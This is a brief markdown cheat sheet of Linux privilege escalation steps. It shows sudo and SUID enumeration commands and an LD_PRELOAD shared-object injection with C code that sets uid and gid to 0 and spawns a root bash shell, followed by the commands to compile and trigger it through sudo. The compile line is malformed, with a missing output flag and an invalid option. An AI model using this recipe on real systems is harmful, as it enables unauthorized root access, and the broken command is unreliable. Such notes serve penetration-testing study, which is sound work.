# Linux Privesc
### Find sudo permitted files
```
sudo -l
```

### Find SUID binaries
```
find / -type f -perm -u=s 2>/dev/null
```

### Find SUID binaries
```
find / -type f -perm -4000 2>/dev/null
```

### Shared Object Injection
- Sudo -l to enumerate
- LD_PRELOAD
- create and compile C file to output shared-object file
```
#include<stdio.h>
#include<sys/types.h>
#include<stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
- compile
```
gcc -fPIC -shared shell.so shell.c -notestfiles
```
- exploit
```
sudo LD_PRELOAD=/path/to/file.so apache2
```

